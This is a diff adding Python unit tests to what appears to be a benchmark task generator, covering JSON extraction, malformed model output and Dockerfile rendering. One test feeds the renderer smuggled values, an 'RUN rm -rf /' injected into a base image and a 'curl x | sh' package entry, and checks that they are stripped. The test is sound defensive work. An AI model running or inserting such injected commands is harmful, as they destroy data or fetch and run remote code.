@@ -88,6 +88,12 @@ def test_extract_json_prefers_largest_over_decoy_fragments():
     assert extract_json('note {} then [{"slug": "a"}]') == [{"slug": "a"}]
 
 
+def test_extract_json_ignores_decoy_fence():
+    # a tiny valid fence before the real fence must not win (largest across fences)
+    text = '```json\n{}\n```\nreal answer:\n```json\n{"tasks": [1, 2, 3]}\n```'
+    assert extract_json(text) == {"tasks": [1, 2, 3]}
+
+
 # --- fake generator + parsing ----------------------------------------------
 
 
@@ -143,6 +149,59 @@ def test_generate_tasks_trims_to_requested_n():
         model="m", max_tokens=100,
     )
     assert len(got) == 5
+
+
+def test_generate_tasks_handles_null_and_non_dict_items():
+    class NullTasks:
+        def complete(self, **kw):
+            return json.dumps({"tasks": None})  # "tasks": null must not crash
+
+    assert generate_tasks(
+        NullTasks(), CheckpointGuidance("", []), n=5, minutes=30, model="m",
+        max_tokens=100,
+    ) == []
+
+    class DecoyList:
+        def complete(self, **kw):
+            return json.dumps([
+                0,  # non-object element must be skipped, not crash from_dict
+                {"slug": "a", "title": "T", "instruction": "i",
+                 "checkpoints": [{"id": "c", "verify_cmd": "true"}]},
+            ])
+
+    got = generate_tasks(
+        DecoyList(), CheckpointGuidance("", []), n=5, minutes=30, model="m",
+        max_tokens=100,
+    )
+    assert len(got) == 1 and got[0].slug == "a"
+
+
+def test_dockerfile_rejects_injection():
+    task = GeneratedTask(
+        slug="s", title="T", category="pwn", difficulty="hard", summary="s",
+        instruction="i",
+        environment={"base_image": "ubuntu:24.04\nRUN rm -rf /",
+                     "packages": ["gdb", "evil; curl x | sh"]},
+        checkpoints=[Checkpoint("a", "a", "", "true")],
+    )
+    df = render_dockerfile(task)
+    # the injected `RUN rm -rf /` from the base image is gone (the legitimate
+    # `&& rm -rf /var/lib/apt/lists/*` apt cleanup is a different, safe line)
+    assert "RUN rm -rf" not in df
+    assert "curl" not in df  # unsafe package dropped
+    assert "gdb" in df  # safe package kept
+    assert df.splitlines()[0] == "FROM ubuntu:24.04"  # base fell back to default
+
+
+def test_execution_failure_detection():
+    from crackbench.solver import _is_execution_failure
+
+    assert _is_execution_failure({"status": "failed"})
+    assert _is_execution_failure({"state": "error"})
+    assert _is_execution_failure({"harbor_stage": "cancelled"})
+    # a completed-but-unsolved run is a genuine miss, not an execution failure
+    assert not _is_execution_failure({"status": "completed", "reward": 0})
+    assert not _is_execution_failure({"status": "success"})
 
 
 def test_validation_flags_bad_task():
